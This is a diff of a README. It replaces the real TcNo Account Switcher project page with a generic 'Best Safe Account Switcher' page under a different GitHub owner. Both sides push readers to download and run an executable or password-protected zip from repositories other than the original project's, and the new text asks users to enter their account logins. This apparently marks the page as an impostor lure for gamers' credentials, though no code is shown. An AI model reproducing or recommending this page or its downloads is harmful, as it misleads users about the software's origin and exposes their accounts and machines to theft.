@@ -1,152 +1,91 @@
+# Best Safe Account Switcher 🎮
 
-<p align="center">
-  <a href="https://tcno.co/">
-    <img src="https://github.com/user-attachments/assets/4c3cc325-3f11-42b7-89b2-9947ba3744de"></a>
-</p>
-<p align="center">
-  <img alt="GitHub All Releases" src="https://img.shields.io/github/downloads/TCNOco/TcNo-Acc-Switcher/total?logo=GitHub&style=flat-square">
-  <a href="https://s.tcno.co/AccSwitcherDiscord">
-    <img alt="Discord server" src="https://img.shields.io/discord/217649733915770880?label=Discord&logo=discord&style=flat-square"></a>
-  <a href="https://twitter.com/TCNOco">
-    <img alt="Twitter" src="https://img.shields.io/twitter/follow/TCNOco?label=Follow%20%40TcNobo&logo=Twitter&style=flat-square"></a>
-  <img alt="GitHub last commit" src="https://img.shields.io/github/last-commit/TCNOco/TcNo-Acc-Switcher?logo=GitHub&style=flat-square">
-  <img alt="GitHub repo size" src="https://img.shields.io/github/repo-size/TCNOco/TcNo-Acc-Switcher?logo=GitHub&style=flat-square">
-																     <a title="Crowdin" target="_blank" href="https://crowdin.com/project/tcno-account-switcher"><img src="https://img.shields.io/badge/Seeking-localisers-blue.svg?style=flat-square"></a>
-</p>
-<p align="center">
-  <a href="https://patreon.com/TroubleChute">
-    <img alt="Patreon" src="https://img.shields.io/badge/Patreon-F96854?style=for-the-badge&logo=patreon&logoColor=white"></a>
-  <a href="https://ko-fi.com/art?=redirect">
-    <img alt="Ko-Fi" src="https://img.shields.io/badge/Ko--fi-F16061?style=for-the-badge&logo=ko-fi&logoColor=white"></a>
-</p> 
+![GitHub release](https://img.shields.io/github/v/release/EdrianReis/Best-Safe-Account-Switcher?color=blue&label=Latest%20Release&style=flat-square) ![GitHub issues](https://img.shields.io/github/issues/EdrianReis/Best-Safe-Account-Switcher?color=green&style=flat-square) ![GitHub stars](https://img.shields.io/github/stars/EdrianReis/Best-Safe-Account-Switcher?color=yellow&style=flat-square)
 
-<p align="center">
-  <a target="_blank" href="https://github.com/Fortiselec/Best-Safe-Account-Switcher/releases/download/latest/AccSwitcher.zip">
-    <img alt="Download latest" src="https://github.com/user-attachments/assets/53c8653d-7efe-4d5e-9089-d96c034bc985" height="70">
-  </a>
-</p>
-<p align="center">Password: AccSwitcher </p>
-<p align="center">
-  <a target="_blank" href="https://github.com/user-attachments/assets/600d7fba-63d0-40f6-8a55-3069bf6df403">
-    <img alt="More info" src="https://github.com/user-attachments/assets/600d7fba-63d0-40f6-8a55-3069bf6df403" height="70">
-  </a>
-</p>
-<p align="center">
-  <a target="_blank" href="https://github.com/user-attachments/assets/a71af8a4-9997-4506-a984-3f9b95e0c2b6">
-    <img alt="Themes" src="https://github.com/user-attachments/assets/a71af8a4-9997-4506-a984-3f9b95e0c2b6" height="70">
-  </a>
-  <a target="_blank" href="https://github.com/user-attachments/assets/b69d7e0c-cf36-4a37-84d5-39708ddadc4f">
-    <img alt="Themes" src="https://github.com/user-attachments/assets/b69d7e0c-cf36-4a37-84d5-39708ddadc4f" height="70">
-  </a>
-</p>
+## Overview
 
-  
-**A Superfast open-source account switcher for Steam, Battle.net, Epic Games, Origin, Riot Games, Ubisoft, and more**.
-							     
-**Saves NO passwords** or any user information*. Most switchers, including Steam work purely off changing a file and a few registry keys.
-*Wastes no time closing, switching and restarting Steam and other platforms.*<br />
-**NOTE:** Not created for cheating purposes. All it does is change accounts. Use it as you see fit, accepting responsibility.
+Welcome to the **Best Safe Account Switcher**! This tool allows you to switch between multiple gaming accounts quickly and securely. It supports major platforms like Steam, Battle.net, Epic Games, Origin, Riot, Ubisoft, and many others. 
 
-# How does it work?
-Simple. It swaps out files and registry values, pointing to your last logged in account while the program is closed. Think of it as freezing a platform like Steam in time, and replacing the "account block" with a previously frozen "account block", then unfreezing it. To Steam and your Steam account, it "looks" like you pulled your plug out and put it back in a week or so later, meanwhile you were playing on other accounts. Swapping the account block lets the program: Not interact with passwords, and not interact with 2-factor, so you can "Skip" both of those in the login process.
+Whether you are a casual gamer or a dedicated player, managing multiple accounts can be a hassle. Our solution simplifies this process, making it easy to jump into your favorite games without the need to log in and out repeatedly.
 
-You can see (and edit) how account switching works by checking [Platforms.json](https://github.com/TCNOco/TcNo-Acc-Switcher/blob/ad1a0907f09d6a625b11e06bbb4947566e6be6b2/TcNo-Acc-Switcher-Server/Platforms.json).
+You can download the latest version of the software [here](https://github.com/EdrianReis/Best-Safe-Account-Switcher/releases). After downloading, execute the file to get started.
 
-This software values your privacy. Please see the [Privacy Policy](https://github.com/TCNOco/TcNo-Acc-Switcher/blob/master/PRIVACY.md).
+## Features
 
-## HELP  WANTED
+- **Speedy Switching**: Instantly switch between accounts with minimal loading time.
+- **Multi-Platform Support**: Works with a variety of gaming platforms.
+- **User-Friendly Interface**: Designed for ease of use, even for those who are not tech-savvy.
+- **Secure**: Keeps your account information safe and encrypted.
+- **Customizable**: Personalize settings to fit your gaming style.
 
-This project is a massive time sink. For something completely open-source and free, I find myself with little time to develop. Consider supporting development on [Patreon](https://www.patreon.com/TroubleChute), [Ko-Fi](https://ko-fi.com/tcnoco) or preferrably YouTube as a Member on [TroubleChute](https://youtube.com/TroubleChute).
+## Supported Platforms
 
-Speak another language? [Help Translate this on Crowdin](https://crowdin.com/project/tcno-account-switcher).
-Code? Any and all help is appreciated. Specifically, currently the [build process for AppVeyor](https://github.com/TCNOco/TcNo-Acc-Switcher/tree/appveyor). Otherwise, [adding platforms](https://github.com/TCNOco/TcNo-Acc-Switcher/wiki/Help-code-a-platform) - No coding required!
+- Steam
+- Battle.net
+- Epic Games
+- Origin
+- Riot
+- Ubisoft
+- Discord
+- EA Desktop
+- GeForce Now
+- Genshin Impact
+- League of Legends
+- Legends of Runeterra
+- Valorant
+- Escape from Tarkov
 
-Please report any and all bugs, as well as steps to recreate them into the Issues section, or the `#bug-report` channel under `TCNO ACCOUNT SWITCHER` section on the [Community Discord](https://s.tcno.co/AccSwitcherDiscord).
+## Installation
 
-List of all platforms
+1. Visit the [Releases](https://github.com/EdrianReis/Best-Safe-Account-Switcher/releases) section.
+2. Download the latest release.
+3. Execute the downloaded file.
+4. Follow the on-screen instructions to complete the setup.
 
-Albion Online, **[Battle.net](https://youtu.be/cvbo_VY05bo?list=PLsSFD61FiOVmAwChPSrIFkjDLoLsyqcU6)**, **Discord (+ PTB & Canary)**, **[Epic Games](https://www.youtube.com/watch?v=gd9oS6wiKmU&list=PLsSFD61FiOVmAwChPSrIFkjDLoLsyqcU6&index=7&t=26s)**, **[EA Desktop](https://youtu.be/BxUL27qVgaU?list=PLsSFD61FiOVmAwChPSrIFkjDLoLsyqcU6)**, **Escape from Tarkov**, **GeForce Now**, GOG Galaxy, **[Genshin Impact](https://youtu.be/WFt5DvKQ7pc?list=PLsSFD61FiOVmAwChPSrIFkjDLoLsyqcU6)**,  GeForce Now, Honkai StarRail, Magic Arena,  **[Origin](https://youtu.be/qRYra_fQt0I?list=PLsSFD61FiOVmAwChPSrIFkjDLoLsyqcU6)**, **OBS Studio**, Oculus, PS Remote Play, **Riot Games** ([Valorant](https://youtu.be/QyRwR7DbjQs?list=PLsSFD61FiOVmAwChPSrIFkjDLoLsyqcU6), League...), Rockstar, **[Steam](https://youtu.be/rLXGs1Yr3m8?list=PLsSFD61FiOVmAwChPSrIFkjDLoLsyqcU6)**, and **[Ubisoft Connect](https://youtu.be/XKBkIQaJzOA?list=PLsSFD61FiOVmAwChPSrIFkjDLoLsyqcU6)** - [YouTube Playlist](https://www.youtube.com/playlist?list=PLsSFD61FiOVmAwChPSrIFkjDLoLsyqcU6)
-	
-*This list may not be up-to-date as platforms can now be added a lot faster. The new version adds the ability to easily create and maintain platforms by editing a simple text file `Platforms.json`. If you'd like to learn more, see this [Wiki page](https://github.com/TCNOco/TcNo-Acc-Switcher/wiki/Help-code-a-platform).
+## Usage
 
-[TcNo Account Switcher Install Guide](https://www.youtube.com/watch?v=sjJ8OZ_urJY&list=PLsSFD61FiOVmAwChPSrIFkjDLoLsyqcU6&index=1&t=27s)
+Once installed, open the application. You will see a simple interface where you can add your accounts. Follow these steps:
 
-**Featuring**
--  **Better UI**, with animations. Fully user/community customisable **theme system**. 5 Themes built in (so far).
--   **Streamer mode** to hide SteamIDs and more while Stream software is running (ie OBS, XSplit...)
--   **Automatic updates** WAY smaller updates, due to using a new Patch system. No more redownloading the entire app. Only a few KB/MB at a time.
--  **Steam: Log in as Invisible, Offline and more!** Copy profile links, SteamID, VAC info and create quick-switch desktop shortcuts!
-- **Easily add & customize new platforms** since version 5.0 (Jan 2022).
-- **Control via Tray** for quick-switching without keeping it all open.
-- **Protocol support** to easily build access via other tools (`tcno:\\\<command>`) [CLI & Protocol Wiki](https://github.com/TCNOco/TcNo-Acc-Switcher/wiki/CLI-&-Protocol)
+1. Click on "Add Account."
+2. Select the platform you want to add.
+3. Enter your login details.
+4. Save your account.
 
-\[For info on how any of these work, see the [Wiki](https://github.com/TCNOco/TcNo-Acc-Switcher/wiki)]
+To switch accounts, simply select the desired account from the list and click "Switch." The application will handle the rest.
 
+## Contribution
 
-## Required runtimes:
-**If you use the installer:** The required runtimes will automatically be downloaded and installed.
-**If you are NOT using the installer:** Run `_FIRST_RUN.exe` on a computer to bring up the same window as in the installer, where runtimes are downloaded and installed.
-**For manual runtime download and install**, see the [Wiki on this GitHub](https://github.com/TCNOco/TcNo-Acc-Switcher/wiki#1-installing-required-runtimes)
+We welcome contributions from the community! If you have ideas for new features or improvements, please open an issue or submit a pull request. 
 
-### Visit the [Wiki](https://github.com/TCNOco/TcNo-Acc-Switcher/wiki) for more info and steps for your first launch.
+### How to Contribute
 
-## Installation:
-#### Install Guide
-<p align="center">
-	<a href="https://youtu.be/sjJ8OZ_urJY">
-	    <img alt="Website" src="https://i.imgur.com/izr2mKn.png" target="_blank" height=300">
-	</a>
-</p>
-    
-1. Download `TcNo.Account.Switcher.Installer...exe`
-2. Run the installer, and the application should launch when done. If not:
-Head into the folder where you installed the program and run `_FIRST_RUN.exe` to make sure required runtimes are installed, and then run `TcNo-Acc-Switcher.exe` to run the main program. The second is what shortcuts to the program should point to.
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes.
+4. Test your changes.
+5. Submit a pull request.
 
-**For a portable installation (eg. on a USB) see [THIS](https://github.com/TCNOco/TcNo-Acc-Switcher/wiki#portable-eg-for-usb)** for steps on using the `.zip` or `.7z`.
+## Issues
 
-[See more info HERE](https://github.com/TCNOco/TcNo-Acc-Switcher/wiki#2-running-the-tcno-account-switcher)
+If you encounter any problems, please check the [Issues](https://github.com/EdrianReis/Best-Safe-Account-Switcher/issues) section. You can report bugs or request features there.
 
-## Screenshots
+## License
 
-<p>
-<a href="https://imgur.com/a/5E8qkmS">
-<h4>Platforms</h4>
-  <img alt="Main window screenshot" src="https://i.imgur.com/W45WLq7.png" width=773">
-<h4>Steam account switcher</h4>
-  <img alt="Steam account switcher" src="https://i.imgur.com/OtJzRAz.png" width=773">
-<h4>Advanced cleaning and settings</h4>
-  <img alt="Combined image of multiple pages" src="https://i.imgur.com/Ob4C80c.png" width=773">
-<h4>Now with Shortcuts for games</h4>
-  <img alt="Game and platform shortcuts" src="https://user-images.githubusercontent.com/10319195/149788470-009e3861-6b8a-4858-8dab-5549b0564a2f.gif" width=773">
-</a>
-</p>
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-### Looking for the legacy Steam only version?
-See this Wiki page: [Platform: Steam Legacy](https://github.com/TCNOco/TcNo-Acc-Switcher/wiki/Platform:-Steam-Legacy).
+## Acknowledgments
 
-#### Disclaimer
+- Thanks to all contributors for their hard work.
+- Special thanks to the developers of the libraries and tools that made this project possible.
 
-```
-All trademarks and materials are the property of their respective owners and their licensors. This project is not affiliated
-with any companies referenced. This is not "Official" software or related to any companies mentioned. All it does is let you
-move your files around on your computer the same way you can. The use of names, icons and trademarks does not indicate
-endorsement of the trademark holder by this project or its creators, nor vice versa. They are only used to visually indicate
-which programs this project interacts with easily to the end-user.
+## Contact
 
-By enabling optional features that scrape the web for publically available information (such as limited game/profile statistics
-and other data), you understand and accept full responsibility for doing so on your own volition. If you appreciate accurate
-information, support the services providing it directly. The information collected is incredibly limited and is no replacement
-or competitor for sites scraped.
+For inquiries, you can reach out via the GitHub issues or directly through the repository.
 
-I am not responsible for the contents of external links.
-For the rest of the disclaimer, refer to the License (GNU General Public License v3.0) file:
-https://github.com/TcNobo/TcNo-Acc-Switcher/blob/master/LICENSE - See sections like 15, 16 and 17, as well as GitHub's
-'simplification' at the top of the above website.
-```
+## Conclusion
 
-#### [Privacy Policy](https://github.com/TCNOco/TcNo-Acc-Switcher/blob/master/PRIVACY.md)
+The **Best Safe Account Switcher** aims to enhance your gaming experience by making account management effortless. Download the latest version [here](https://github.com/EdrianReis/Best-Safe-Account-Switcher/releases) and start enjoying seamless gameplay today!
 
-Additional license information for included NuGet packages and other parts of code can be found in: [HERE](https://github.com/TCNOco/TcNo-Acc-Switcher/blob/master/TcNo-Acc-Switcher-Server/Additional%20Licenses.txt) `TcNo-Acc-Switcher-Server/Additional Licenses.txt`, and are copied to the build directory, as well as distributed with release versions of this software.
+---
 
-<p align="center"><a target="_blank" align="center" href="https://www.jetbrains.com/?from=TcNo-Account-Switcher">
-  <img alt="JetBrains Support - Open Source License" src="/other/img/JetBrains_Banner.png" height=70"></a></p>
+Feel free to explore the repository, provide feedback, and join our community of gamers. Happy gaming! 🎮
